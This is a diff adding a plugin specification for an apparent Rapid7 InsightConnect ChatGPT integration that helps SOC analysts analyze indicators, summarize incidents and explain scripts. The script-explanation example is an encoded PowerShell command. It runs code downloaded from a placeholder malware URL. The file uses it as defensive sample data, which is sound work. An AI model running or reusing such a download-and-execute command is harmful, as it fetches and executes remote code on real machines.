@@ -1,0 +1,320 @@
+plugin_spec_version: v2
+extension: plugin
+products: [insightconnect]
+name: chatgpt
+title: ChatGPT
+description: Interact with OpenAI ChatGPT models to assist SOC analysts with threat analysis, incident summarization, script explanation, and response recommendations
+version: 1.0.0
+connection_version: 1
+supported_versions: ["gpt-4o", "gpt-4o-mini", "gpt-4-turbo", "gpt-3.5-turbo"]
+vendor: rapid7
+support: rapid7
+cloud_ready: true
+status: []
+resources:
+  source_url: https://github.com/rapid7/insightconnect-plugins/tree/master/plugins/chatgpt
+  license_url: https://github.com/rapid7/insightconnect-plugins/blob/master/LICENSE
+  vendor_url: https://openai.com
+tags:
+  - chatgpt
+  - openai
+  - ai
+  - soc
+  - threat_analysis
+hub_tags:
+  use_cases: [threat_detection_and_response]
+  keywords: [ai, chatgpt, openai, cloud_enabled]
+  features: []
+links:
+  - '[OpenAI](https://openai.com)'
+  - '[OpenAI API Reference](https://platform.openai.com/docs/api-reference)'
+references:
+  - '[OpenAI Chat Completions API](https://platform.openai.com/docs/guides/chat-completions)'
+key_features:
+  - Send prompts to ChatGPT and receive AI-generated responses
+  - Analyze indicators of compromise with AI-powered threat context
+  - Summarize security incidents into concise executive briefings
+  - Get AI-recommended response actions for security incidents
+  - Explain suspicious scripts and commands with security context
+requirements:
+  - OpenAI API key with access to Chat Completions API
+  - Sufficient API credits/quota for the selected model
+version_history:
+  - 1.0.0 - Initial plugin release with Ask ChatGPT, Analyze Indicator, Summarize Incident, Suggest Response Actions, and Explain Script actions
+sdk:
+  type: full
+  version: 6.6.0
+  user: nobody
+connection:
+  api_key:
+    title: API Key
+    description: OpenAI API key for authenticating to the ChatGPT API
+    type: credential_secret_key
+    required: true
+    example: '{"secretKey": "sk-proj-abc123def456ghi789jkl012mno345pqr678stu901vwx234"}'
+  model:
+    title: Model
+    description: Default ChatGPT model to use for completions
+    type: string
+    required: true
+    default: gpt-4o
+    example: gpt-4o
+    enum:
+      - gpt-4o
+      - gpt-4o-mini
+      - gpt-4-turbo
+      - gpt-3.5-turbo
+actions:
+  ask_chatgpt:
+    title: Ask ChatGPT
+    description: Send a prompt to ChatGPT and receive a response
+    input:
+      prompt:
+        title: Prompt
+        description: The prompt or question to send to ChatGPT
+        type: string
+        required: true
+        example: What are the common indicators of a phishing email?
+        placeholder: Enter your prompt
+      system_message:
+        title: System Message
+        description: Optional system message to set the behavior and context for the AI assistant
+        type: string
+        required: false
+        example: You are a cybersecurity analyst assistant
+        placeholder: Enter system instructions
+      max_tokens:
+        title: Max Tokens
+        description: Maximum number of tokens in the response (higher values allow longer responses)
+        type: integer
+        required: false
+        default: 2048
+        example: 2048
+      temperature:
+        title: Temperature
+        description: Controls randomness in the response (0.0 = deterministic, 2.0 = most random)
+        type: float
+        required: false
+        default: 0.7
+        example: 0.7
+    output:
+      response:
+        title: Response
+        description: The text response from ChatGPT
+        type: string
+        required: true
+        example: Common indicators of a phishing email include suspicious sender addresses, urgent language, unexpected attachments, and mismatched URLs
+      usage:
+        title: Usage
+        description: Token usage details for the request
+        type: object
+        required: true
+        example: '{"prompt_tokens": 25, "completion_tokens": 150, "total_tokens": 175}'
+  analyze_indicator:
+    title: Analyze Indicator
+    description: Submit an indicator of compromise (IP, domain, hash, or URL) to ChatGPT for threat context analysis
+    input:
+      indicator:
+        title: Indicator
+        description: The indicator of compromise to analyze (IP address, domain, file hash, or URL)
+        type: string
+        required: true
+        example: 198.51.100.23
+        placeholder: Enter an IOC (IP, domain, hash, or URL)
+      indicator_type:
+        title: Indicator Type
+        description: The type of indicator being submitted
+        type: string
+        required: true
+        example: ip_address
+        enum:
+          - ip_address
+          - domain
+          - file_hash
+          - url
+      additional_context:
+        title: Additional Context
+        description: Optional additional context about where this indicator was observed
+        type: string
+        required: false
+        example: Observed in outbound DNS traffic from a compromised workstation
+        placeholder: Describe where the indicator was found
+    output:
+      analysis:
+        title: Analysis
+        description: AI-generated threat analysis of the indicator
+        type: string
+        required: true
+        example: "The IP address 198.51.100.23 is associated with known command-and-control infrastructure. Recommended actions: block at firewall, investigate endpoints that communicated with this IP"
+      risk_assessment:
+        title: Risk Assessment
+        description: Brief risk level assessment based on the analysis
+        type: string
+        required: true
+        example: HIGH - Associated with known C2 infrastructure
+      recommended_actions:
+        title: Recommended Actions
+        description: List of recommended response actions based on the analysis
+        type: "[]string"
+        required: true
+        example: '["Block IP at perimeter firewall", "Search SIEM for historical connections to this IP", "Isolate any endpoints that have communicated with this IP"]'
+  summarize_incident:
+    title: Summarize Incident
+    description: Generate a concise executive summary of a security incident from provided alert data or notes
+    input:
+      incident_data:
+        title: Incident Data
+        description: Raw incident data, alert details, or analyst notes to summarize
+        type: string
+        required: true
+        example: "Alert: Malware detected on WORKSTATION-045. Hash: abc123def456. User: jsmith. Multiple C2 callbacks observed to 198.51.100.23:443. Lateral movement attempted to FILE-SERVER-02."
+        placeholder: Paste incident data, alerts, or notes
+      severity:
+        title: Severity
+        description: Severity level of the incident for context
+        type: string
+        required: false
+        example: high
+        enum:
+          - critical
+          - high
+          - medium
+          - low
+          - informational
+      audience:
+        title: Audience
+        description: Target audience for the summary to adjust technical depth
+        type: string
+        required: false
+        default: technical
+        example: technical
+        enum:
+          - executive
+          - technical
+          - both
+    output:
+      summary:
+        title: Summary
+        description: Concise incident summary tailored to the specified audience
+        type: string
+        required: true
+        example: "INCIDENT SUMMARY: Malware infection detected on WORKSTATION-045 with active C2 communications and lateral movement attempts. Immediate containment recommended."
+      timeline:
+        title: Timeline
+        description: Extracted timeline of events if identifiable from the data
+        type: string
+        required: true
+        example: "1. Malware executed on WORKSTATION-045. 2. C2 callback established to 198.51.100.23:443. 3. Lateral movement attempted to FILE-SERVER-02."
+      key_findings:
+        title: Key Findings
+        description: List of key findings extracted from the incident data
+        type: "[]string"
+        required: true
+        example: '["Active C2 communication to 198.51.100.23", "Lateral movement attempted to FILE-SERVER-02", "User account jsmith potentially compromised"]'
+  suggest_response_actions:
+    title: Suggest Response Actions
+    description: Get AI-recommended response and containment actions for a security incident
+    input:
+      incident_description:
+        title: Incident Description
+        description: Description of the security incident requiring response recommendations
+        type: string
+        required: true
+        example: "Ransomware detected encrypting files on three workstations. Lateral movement observed via SMB. Ransom note referencing LockBit found on desktops."
+        placeholder: Describe the security incident
+      environment_context:
+        title: Environment Context
+        description: Optional context about the environment (network segmentation, critical assets, existing controls)
+        type: string
+        required: false
+        example: "Windows domain environment with 500 endpoints. Critical assets include SQL database servers in isolated VLAN."
+        placeholder: Describe the environment
+      response_phase:
+        title: Response Phase
+        description: Current phase of incident response to tailor recommendations
+        type: string
+        required: false
+        default: containment
+        example: containment
+        enum:
+          - identification
+          - containment
+          - eradication
+          - recovery
+          - lessons_learned
+    output:
+      immediate_actions:
+        title: Immediate Actions
+        description: Prioritized list of immediate actions to take
+        type: "[]string"
+        required: true
+        example: '["Isolate affected workstations from the network immediately", "Block SMB lateral movement via host-based firewall rules", "Disable compromised user accounts"]'
+      investigation_steps:
+        title: Investigation Steps
+        description: Recommended investigation steps to determine scope and impact
+        type: "[]string"
+        required: true
+        example: '["Identify patient zero and initial infection vector", "Search for LockBit IOCs across all endpoints", "Review authentication logs for compromised credentials"]'
+      long_term_recommendations:
+        title: Long-Term Recommendations
+        description: Strategic recommendations to prevent recurrence
+        type: "[]string"
+        required: true
+        example: '["Implement network segmentation between workstation and server VLANs", "Deploy EDR with ransomware-specific detection rules", "Conduct phishing awareness training"]'
+  explain_script:
+    title: Explain Script
+    description: Submit a suspicious script or command for AI-powered explanation with security context
+    input:
+      script:
+        title: Script
+        description: The script content or command to analyze and explain
+        type: string
+        required: true
+        example: "powershell -enc SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBtAGEAbAB3AGEAcgBlACcAKQApAA=="
+        placeholder: Paste the script or command
+      script_type:
+        title: Script Type
+        description: The type or language of the script
+        type: string
+        required: false
+        example: powershell
+        enum:
+          - powershell
+          - bash
+          - python
+          - batch
+          - vbscript
+          - javascript
+          - unknown
+      context:
+        title: Context
+        description: Optional context about where the script was found (e.g., email attachment, scheduled task, registry)
+        type: string
+        required: false
+        example: Found in a scheduled task on a compromised endpoint
+        placeholder: Describe where the script was found
+    output:
+      explanation:
+        title: Explanation
+        description: Human-readable explanation of what the script does
+        type: string
+        required: true
+        example: "This PowerShell command decodes and executes a base64-encoded script that downloads and runs content from http://example.com/malware using the .NET WebClient class"
+      risk_level:
+        title: Risk Level
+        description: Assessment of the script's risk level
+        type: string
+        required: true
+        example: CRITICAL - Downloads and executes remote code
+      techniques:
+        title: Techniques
+        description: MITRE ATT&CK techniques or attack patterns identified in the script
+        type: "[]string"
+        required: true
+        example: '["T1059.001 - PowerShell", "T1027 - Obfuscated Files or Information", "T1105 - Ingress Tool Transfer"]'
+      indicators:
+        title: Indicators
+        description: Any IOCs extracted from the script (URLs, IPs, domains, hashes)
+        type: "[]string"
+        required: true
+        example: '["http://example.com/malware"]'
